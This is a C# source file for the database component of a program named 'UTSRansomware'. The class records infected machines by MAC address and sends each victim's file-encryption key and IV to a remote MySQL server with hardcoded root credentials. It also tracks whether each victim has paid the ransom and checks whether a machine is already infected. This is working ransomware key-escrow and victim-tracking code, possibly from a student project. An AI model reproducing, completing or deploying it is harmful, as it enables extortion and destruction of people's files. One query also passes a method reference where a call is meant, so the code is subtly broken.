using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MySql.Data.MySqlClient;
using System.Net.NetworkInformation;

namespace UTSRansomware
{
    internal static class SQLManager
{
        private static string connectionString = "Server=192.168.50.126;Database=ransomware;User ID=root;Password=1234;";

        public static MySqlConnection GetConnection()
        {
            return new MySqlConnection(connectionString);
        }

        public static void AddComputerToDatabase(byte[] key, byte[] iv)
        {
            string convertedKey = Convert.ToBase64String(key);
            string convertedIV = Convert.ToBase64String(iv);
            using (MySqlConnection connection = GetConnection())
            {
                connection.Open();

                string query = "INSERT INTO infected_computers (computer_id, key, iv, ransom_payed) VALUES (@ComputerId, @Key, @Iv, @RansomPayed)";
                using (MySqlCommand cmd = new MySqlCommand(query, connection))
                {
                    cmd.Parameters.AddWithValue("@ComputerId", GetMACAddress());
                    cmd.Parameters.AddWithValue("@Key", convertedKey);
                    cmd.Parameters.AddWithValue("@Iv", convertedIV);
                    cmd.Parameters.AddWithValue("@RansomPayed", false);

                    cmd.ExecuteNonQuery();
                }
            }
        }

        public static bool ComputerInfected()
        {
            using (MySqlConnection connection = new MySqlConnection(connectionString))
            {
                connection.Open();

                // Define the query
                string query = "SELECT COUNT(*) FROM infected_computers WHERE computer_id = @computerId";
                using (MySqlCommand cmd = new MySqlCommand(query, connection))
                {
                    cmd.Parameters.AddWithValue("@computerId", GetMACAddress);
                    int count = Convert.ToInt32(cmd.ExecuteScalar());

                    // If count is greater than 0, then the computer exists in the table
                    return count > 0;
                }
            }
        }

        public static string GetMACAddress()
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                // Only consider Ethernet network interfaces, thereby skipping loopback, tunnel, etc.
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    nic.OperationalStatus == OperationalStatus.Up)
                {
                    return nic.GetPhysicalAddress().ToString();
                }
            }
            return String.Empty;
        }

    }
}
